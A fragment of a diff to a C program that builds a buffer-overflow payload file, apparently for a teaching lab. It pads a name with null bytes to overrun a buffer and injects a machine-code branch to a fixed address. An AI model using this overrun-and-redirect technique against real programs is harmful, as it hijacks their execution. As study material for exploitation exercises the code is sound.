@@ -31,7 +31,7 @@ int main(void) {
     fprintf(psFile, sName);
 
     /* Add nullbytes to overrun the buffer and mark end of name */
-    for (i = 0; i < 2; i++) {
+    for (i = 0; i < 14; i++) {
         putc(0, psFile);
     }
 
@@ -47,12 +47,12 @@ int main(void) {
 
     fwrite(&uiInstr, sizeof(unsigned int), 1, psFile);
 
-    uiInstr = MiniAssembler_mov(0, 'A');/*MiniAssembler_b(0x40089c, 0x420088); */
+    uiInstr = MiniAssembler_b(0x40089c, 0x420088);
 
     fwrite(&uiInstr, sizeof(unsigned int), 1, psFile);
 
     /* Add nullbytes to overrun the buffer and mark end of name */
-    for (i = 18; i < 32; i++) {
+    for (i = 30; i < 32; i++) {
         putc(0, psFile);
     }
 
